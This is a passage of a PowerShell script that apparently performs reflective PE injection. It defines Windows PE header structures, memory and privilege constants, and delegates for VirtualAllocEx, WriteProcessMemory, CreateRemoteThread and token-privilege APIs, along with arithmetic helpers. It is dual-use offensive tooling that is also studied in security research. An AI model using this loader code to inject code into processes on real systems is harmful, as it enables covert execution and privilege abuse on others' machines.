		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		#Struct IMAGE_DOS_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		#Struct IMAGE_SECTION_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		#Struct IMAGE_BASE_RELOCATION
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		#Struct IMAGE_IMPORT_DESCRIPTOR
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		#Struct IMAGE_EXPORT_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		#Struct LUID
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		#Struct LUID_AND_ATTRIBUTES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		#Struct TOKEN_PRIVILEGES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
		$GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
		# NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
		
		return $Win32Functions
	}
	#####################################

			
	#####################################
	###########    HELPERS   ############
	#####################################

	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				#Sub bytes
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
	    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
